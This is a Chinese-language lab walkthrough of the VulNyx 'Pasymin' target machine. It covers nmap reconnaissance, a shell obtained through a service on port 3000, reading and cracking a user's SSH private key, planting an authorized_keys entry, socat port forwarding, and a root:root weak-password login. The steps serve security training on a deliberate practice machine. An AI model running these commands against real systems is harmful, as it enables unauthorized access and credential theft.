# 环境

来自[Vulny_Pasymin](https://vulnyx.com/#Pasymin)，

# 信息收集

## 主机发现

```bash
nmap -sn 192.168.10.0/24
```

![image-20240909091512195](image/image-20240909091512195.png)

## 端口扫描

```bash
sudo nmap -sT -r -p- 192.168.10.20
```

![image-20240909091702224](image/image-20240909091702224.png)

## 服务详情

```bash
sudo nmap -sVC -O -p22,80,3000 192.168.10.20
```

![image-20240909092845178](image/image-20240909092845178.png)

# 3000端口

## 3000端口拿shell

```bash
nc 192.168.10.20 3000
ls -alh 
!bash
```

## 获取密钥

```bash
cat /home/alfred/.ssh/id_rsa
ssh2john id_rsa >id1
john id1 --wordlist=/usr/share/wordlist/rockyou.txt
账号：alfred
密码：alfredo

#或者直接把自己的公钥写入到靶机
ssh-keygen -t rsa -b 2048
cat /home/rain/.ssh/id_rsa_pub
echo "*id_rsa_pub*">/home/alfred/.ssh/authorized_keys、

ssh alfred@192.168.10.20 -i id_rsa
```

![image-20240909092959457](image/image-20240909092959457.png)

## 端口转发

发现本地10000端口跑了一个web服务，发现只能本地访问

![image-20240909115455224](image/image-20240909115455224.png)

```bash
socat TCP-LISTEN:8888,fork TCP4:127.0.0.1:10000 &  #通过端口转发，使得外网可以访问
```

![image-20240909115920668](image/image-20240909115920668.png)

## 弱口令爆破

尝试root，root成功登录

![image-20240909120430804](image/image-20240909120430804.png)

发现有终端

![image-20240909120355102](image/image-20240909120355102.png)